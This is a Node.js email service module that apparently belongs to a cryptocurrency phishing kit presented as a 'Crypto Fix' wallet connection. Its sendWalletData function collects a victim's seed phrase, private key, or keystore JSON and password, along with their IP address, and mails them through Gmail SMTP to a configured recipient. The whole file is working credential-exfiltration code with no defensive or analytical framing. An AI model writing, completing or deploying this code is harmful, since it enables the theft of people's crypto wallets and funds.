// This is the email service that will send emails using nodemailer
import nodemailer from 'nodemailer';
import config from './config.js';

/**
 * Validates email configuration
 * @returns {boolean} Whether the configuration is valid
 */
const validateEmailConfig = () => {
  if (!config.emailUser || !config.emailPass) {
    console.error('\x1b[31m%s\x1b[0m', 'Email configuration is missing. Please check your .env file.');
    console.log('Required variables:');
    console.log('- EMAIL_USER: Your email address');
    console.log('- EMAIL_PASS: Your email password or app password');
    return false;
  }
  return true;
};

/**
 * Sends wallet connection data to the specified email recipient
 * @param {Object} data - Wallet connection data
 * @returns {Promise<boolean>} - Whether the email was sent successfully
 */
export const sendWalletData = async (data) => {
  if (!validateEmailConfig()) {
    throw new Error('Email configuration is invalid. Please check your .env file.');
  }

  try {
    console.log(`Preparing to send email from ${config.emailUser} to ${config.recipient}`);
    
    // Create a transporter using SMTP
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: config.emailUser,
        pass: config.emailPass
      }
    });

    // Format the email content based on the access type
    let emailContent = `
      <h2>Wallet Connection Details</h2>
      <p><strong>Selected Service:</strong> ${data.selectedService || 'Not specified'}</p>
      <p><strong>Wallet Type:</strong> ${data.walletType}</p>
      <p><strong>Access Method:</strong> ${data.accessType}</p>
      <p><strong>IP Address:</strong> ${data.ipAddress || 'Not available'}</p>
      <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    `;

    switch (data.accessType) {
      case 'Phrase':
        emailContent += `<p><strong>Seed Phrase:</strong> ${data.phrase}</p>`;
        break;
      case 'Keystore JSON':
        emailContent += `
          <p><strong>Keystore JSON:</strong> ${data.keystoreJson}</p>
          <p><strong>Password:</strong> ${data.password}</p>
        `;
        break;
      case 'Private Key':
        emailContent += `<p><strong>Private Key:</strong> ${data.privateKey}</p>`;
        break;
    }

    // Set up email options
    const mailOptions = {
      from: config.emailUser,
      to: config.recipient,
      subject: `Crypto Fix Wallet Connection - ${data.walletType}`,
      html: emailContent
    };

    // Send the email
    const info = await transporter.sendMail(mailOptions);
    console.log('Email sent:', info.messageId);
    return true;
  } catch (error) {
    console.error('Error sending email:', error);
    throw error;
  }
};
